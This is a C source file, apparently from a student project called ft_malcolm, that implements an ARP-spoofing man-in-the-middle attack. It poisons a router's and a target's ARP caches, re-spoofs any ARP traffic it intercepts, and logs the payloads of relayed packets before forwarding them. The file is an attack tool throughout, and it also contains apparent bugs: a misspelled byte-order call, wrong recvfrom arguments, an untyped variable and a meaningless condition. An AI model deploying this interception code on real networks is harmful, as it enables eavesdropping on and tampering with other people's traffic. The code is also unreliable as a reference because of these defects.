
# include <ft_malcolm.h>
# include <arp.h>

# include <netinet/if_ether.h>
# include <signal.h>
# include <sys/time.h>
# include <sys/socket.h>

# include <string.h> // USE MINE ...

# define SADDRVALUETO_SADDRIN(x) (*(struct sockaddr_in*)&(x))

static err_t handle_incoming_arp(uint16_t protocol, in_addr_t addr, proginfo_t* const info)
{
	err_t st = SUCCESS;

	if (ntons(protocol) == ARP_REQUEST)
	{
		if (addr == SADDRVALUETO_SADDRIN(info->router).sin_addr.s_addr)
			st = spoof_router(info);
		else
			st = spoof_target(info);
	}
	else if (ntons(protocol) == ARP_REPLY)
	{
		if ( SADDRVALUETO_SADDRIN(info->router).sin_addr.s_addr)
			st = spoof_target(info);
		else
			st = spoof_router(info);
	}
	else
	{
		///TODO: Print some error
		st = INVPACKETLEN;
	}
	return st;
}

static err_t look_for_arp_packets(proginfo_t* info)
{
	err_t st = SUCCESS;
	static uint8_t buff[0X1000];
	struct ethhdr* const eth = (struct ethhdr*)buff;
	struct sockaddr src;
	
	const ssize_t recvbytes = recvfrom(info->sockarp, buff, sizeof(buff) / sizeof(*buff), 0, &src, sizeof(src));

	if (recvbytes < 0)
	{
		///TODO: Print some error
		st = INVSYSCALL;
		goto error;
	}
	else if (recvbytes == 0)
		goto error;

	if (eth->h_proto == ETH_P_ARP)
		st = handle_incoming_arp(((struct ether_arp*)(buff + sizeof(*eth)))->arp_op, SADDRVALUETO_SADDRIN(src).sin_addr.s_addr, info);

error:
	return st;
}

static err_t forward_packet(int sockfd, uint8_t* const packet, ssize_t packetlen, const struct sockaddr* dest)
{
    err_t st = SUCCESS;

    const sentbytes = sendto(sockfd, packet, packetlen, 0, dest, sizeof(*dest));

    if (sentbytes < 0)
    {
        ///TODO: Print some error
        st = INVSYSCALL;
    }
    else if (sentbytes != packetlen)
    {
        ///TODO: Print something like: "bytes sent != received exit"
        st = INVPACKETLEN;
    }
    return st;
}

err_t   man_of_the_midle(const char* av[], const proginfo_t* const info, volatile sig_atomic_t* unpoinson)
{
    err_t			st = SUCCESS;
    struct sockaddr	sinfo;
    ssize_t			recvbytes = 0;
    static uint8_t	buff[0X10000];
    struct ethhdr* const eth = (struct ethhdr*)buff;

    ///TODO: Parse router & optional flags at the end

    /* Spoof my MAC address into router's ARP table at target's ip index*/
    if ((st = spoof_router(info)) != SUCCESS)
        goto error;

    /* Try to always unpoison target & router if the program is interrupted */ 
    *unpoinson = true;

    /* Spoof my MAC address into router's ARP table at target's ip index*/
    if ((st = spoof_target(info)) != SUCCESS)
        goto error;

	struct timeval tv = (struct timeval){
		.tv_sec = 0,
		.tv_usec = 10
	};

	/* Make ARP socket non blocking for intercept incoming ARP packets */
	if (setsockopt(info->sockarp, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
	{
		///TODO: Print some err
		st = INVSYSCALL;
		goto error;
	}

    for ( ; ; )
    {
        if ((recvbytes = recvfrom(info->sockip, buff, sizeof(buff) / sizeof(*buff), 0, &sinfo, sizeof(sinfo))) < 0)
        {
            ///TODO: Some error msg
            st = INVSYSCALL;
            goto error;
        }

        /* Supports only IPv4 for the moment */
        if (SADDRVALUETO_SADDRIN(sinfo).sin_family != AF_INET)
            continue ;

        /* Intercept and spoof any attempt of ARP */
		if ((st = look_for_arp_packets(info)) != SUCCESS)
			goto error;

        /* (filter) Log/forward only packet from target or router */
        if (SADDRVALUETO_SADDRIN(sinfo).sin_addr.s_addr == SADDRVALUETO_SADDRIN(info->router.addr).sin_addr.s_addr)
        {
            /* Log packet's matadada and payload */
            log_content(buff, recvbytes);
            /* Overwritte the src's MAC address with mine */
            memcpy(eth->h_source, info->mymachine.mac, SIZEOFMAC);
            /* Sent packet to its destination (in victim's point of view) */
            if ((st = forward_packet(info->sockip, buff, recvbytes, (const struct sockaddr*)&info->target.addr)) != SUCCESS)
                goto error;
        }
        else if (SADDRVALUETO_SADDRIN(sinfo).sin_addr.s_addr == SADDRVALUETO_SADDRIN(info->target.addr).sin_addr.s_addr)
        {
            log_content(buff, recvbytes);
            memcpy(eth->h_source, info->mymachine.mac, SIZEOFMAC);
            if ((st = forward_packet(info->sockip, buff, recvbytes, (const struct sockaddr*)&info->router.addr)) != SUCCESS)
                goto error;
        }

        memset(buff, 0, recvbytes);
    }

error:
    return st;
}
